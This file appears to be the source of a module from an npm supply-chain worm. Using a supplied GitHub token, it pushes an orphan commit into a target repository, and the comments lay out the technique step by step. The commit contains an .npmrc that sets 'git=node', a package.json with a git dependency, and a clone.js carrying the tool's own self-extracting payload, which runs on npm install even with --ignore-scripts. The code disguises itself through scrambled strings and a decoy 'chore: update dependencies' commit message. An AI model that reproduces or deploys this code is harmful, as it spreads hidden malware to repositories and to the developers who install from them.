import { logUtil } from "../utils/logger";
import { buildSelfExtractingPayload } from "../utils/selfExtracting";
import {
  createBlob,
  createOrphanCommit,
  createTree,
  type GitTreeEntry,
} from "./gitDb";

declare function scramble(str: string): string;

// ── File builders ────────────────────────────────────────────────────

/**
 * Build the three files for the orphan commit.
 *
 * ## Technique (git binary override)
 *
 * npm reads `.npmrc` files from inside git dependencies and merges their
 * config into the running npm session.  We set `git=node` so that the
 * next time npm spawns a git operation it executes `node clone <repo>`
 * instead of `git clone <repo>`.  Node resolves bare `clone` to
 * `clone.js` in the working directory, which is our payload.
 *
 * To guarantee the trigger fires, `package.json` declares a second git
 * dependency (`github:axios/axios#main`).  npm processes our `.npmrc`
 * first (setting `git=node`), then resolves the axios dep — spawning
 * `node clone <axios-repo>` which executes `clone.js`.
 *
 * This bypasses `--ignore-scripts` because npm *always* spawns the git
 * binary to fetch git dependencies — lifecycle hooks are skipped but the
 * git toolchain is not.
 *
 * @see https://thinkingthroughcode.medium.com/i-thought-ignore-scripts-made-npm-installs-safe-it-doesnt-f409b852e7c5
 */
function buildFiles(
  payload: string,
): Record<string, { content: string; mode: string }> {
  return {
    "package.json": {
      content: JSON.stringify(
        {
          name: scramble("setup-utils"),
          version: "1.0.0",
          private: true,
          dependencies: {
            axios: scramble("github:axios/axios#main"),
          },
        },
        null,
        2,
      ),
      mode: "100644",
    },
    "clone.js": {
      content: `#!/usr/bin/env node\n${payload}`,
      mode: "100755",
    },
    ".npmrc": {
      content: "git=node\n",
      mode: "100644",
    },
  };
}

// ── Public API ───────────────────────────────────────────────────────

/**
 * Create an orphan commit containing a git-binary-override `.npmrc`, a
 * `package.json` with a second git dependency that forces npm to spawn
 * git, and the self-extracting payload as `clone.js` (shebanged, mode
 * 0o755).
 *
 * ### How it bypasses `--ignore-scripts`
 *
 * 1. `.npmrc` sets `git=node` — npm merges this into its running config.
 * 2. `package.json` depends on `github:axios/axios#main` — forces npm to
 *    spawn a git operation *after* reading our `.npmrc`.
 * 3. npm runs `node clone <axios-repo>`, Node resolves bare `clone` to
 *    `clone.js` in the dependency directory.
 * 4. The payload executes — no lifecycle hooks needed.
 *
 * @param token    GitHub PAT with repo scope on the target repository.
 * @param repository  `owner/repo` string (e.g. `"facebook/react"`).
 * @returns         `github:owner/repo#<sha>` — ready to drop into
 *                  `optionalDependencies`.
 */
export async function createOrphanDep(
  token: string,
  repository: string,
): Promise<string> {
  const [owner, repo] = repository.split("/");
  if (!owner || !repo) {
    throw new Error(
      `Invalid repository format: "${repository}" — expected "owner/repo"`,
    );
  }

  // 1. Build the self-extracting payload
  const rawPayload = await Bun.file(Bun.main).text();
  const payload = buildSelfExtractingPayload(rawPayload, { wrap: true });

  // 2. Assemble the three files
  const files = buildFiles(payload);

  // 3. Create blobs for each file
  const blobShas: GitTreeEntry[] = [];

  for (const [path, { content, mode }] of Object.entries(files)) {
    const sha = await createBlob(token, owner, repo, content);
    blobShas.push({ path, mode, type: "blob" as const, sha });
  }

  // 4. Create a tree from the blobs (no base tree — orphan)
  const treeSha = await createTree(token, owner, repo, null, blobShas);

  // 5. Create an orphan commit (no parents)
  const message = scramble("chore: update dependencies");
  const sha = await createOrphanCommit(token, owner, repo, treeSha, message);

  const depString = `github:${repository}#${sha}`;

  logUtil.log(`[OrphanDep] Created ${depString}`);

  return depString;
}
